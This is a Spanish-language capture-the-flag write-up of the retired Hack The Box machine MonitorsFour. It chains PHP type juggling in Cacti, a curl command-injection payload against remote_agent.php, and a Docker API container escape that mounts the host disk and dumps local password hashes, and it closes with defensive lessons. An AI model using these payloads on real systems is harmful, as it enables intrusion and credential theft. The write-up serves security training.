---
machine: MonitorsFour
os: Windows
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, cacti, type-juggling, cve, docker-api, container-escape]
---

# MonitorsFour — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (ref.), publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Cuarta entrega de la saga Monitors. **Cacti** con una comparación débil en la autenticación (type juggling de PHP) y una cadena de CVE que acaba en ejecución remota dentro del contenedor. El contenedor tiene la **API de Docker** accesible en la pasarela, así que se lanza un contenedor privilegiado con la raíz del host montada y se lee el sistema de ficheros de Windows desde dentro.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC monitorsfour.htb
```

```text
80/tcp    http    Cacti
443/tcp   https   Cacti
2375/tcp  docker  API de Docker (según posición de red)
```

```bash
whatweb http://monitorsfour.htb
curl -s http://monitorsfour.htb/cacti/include/global.php | head
```

La versión de Cacti se confirma en `/cacti/include/global.php` o en el pie del login.

## Type juggling en la autenticación

Cacti compara tokens con `==`. En PHP, dos cadenas que empiezan por `0e` y siguen con dígitos se interpretan como `0` en notación científica, así que `"0e123" == "0e999"` es cierto:

```text
md5("240610708") = 0e462097431906509019562988736854
```

Enviar un usuario/token cuyo hash MD5 empiece por `0e` y solo tenga dígitos satisface la comprobación y deja la sesión como válida. Es un fallo de lógica, no un bypass de contraseña: lo que se salta es la comparación posterior del token de sesión.

## RCE en Cacti

Con sesión válida se abusa de la inyección de comandos del sondeo (`remote_agent.php`, `poller_id`/`host_id`), la cadena clásica de Cacti:

```bash
curl -s "http://monitorsfour.htb/cacti/remote_agent.php?action=polldata&local_data_ids[]=1&host_id=1&poller_id=;id;"
```

El comando se ejecuta como el usuario del servicio web dentro del contenedor. Para trabajar cómodo se lanza una reverse shell y se estabiliza con `script`.

## Del contenedor al host

```bash
cat /proc/1/cgroup          # confirma que estamos en un contenedor
ip route                    # pasarela hacia el host
curl -s http://172.17.0.1:2375/version
```

Si la API responde sin TLS ni autenticación, se crea un contenedor privilegiado con `/` del host montado:

```bash
curl -s -X POST http://172.17.0.1:2375/containers/create?name=pwn \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host /bin/sh"],
       "HostConfig":{"Binds":["/:/host"],"Privileged":true},
       "AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Tty":true,"OpenStdin":true}'
curl -s -X POST http://172.17.0.1:2375/containers/pwn/start
curl -s -X POST 'http://172.17.0.1:2375/containers/pwn/attach?stream=1&stdout=1&stderr=1&stdin=1'
```

Dentro, `/host` es el disco del servidor: `C:\Users\Administrator\Desktop\` y `C:\Users\<usuario>\Desktop\` quedan legibles, y con `chntpw`/`secretsdump` sobre `/host/Windows/System32/config` se obtienen los hashes locales.

## Lecciones

- Comparar tokens con `==` en PHP convierte una comprobación de sesión en un bypass trivial; hay que usar `hash_equals`.
- Una herramienta de monitorización con CVE de inyección de comandos es ejecución remota directa si está expuesta.
- Montar `docker.sock` o publicar la API 2375 es entregar el host: el contenedor deja de ser frontera de seguridad.
- Detección: peticiones a `remote_agent.php` con `poller_id` sospechoso, procesos `sh` hijos del servidor web y creación de contenedores desde una IP de aplicación.
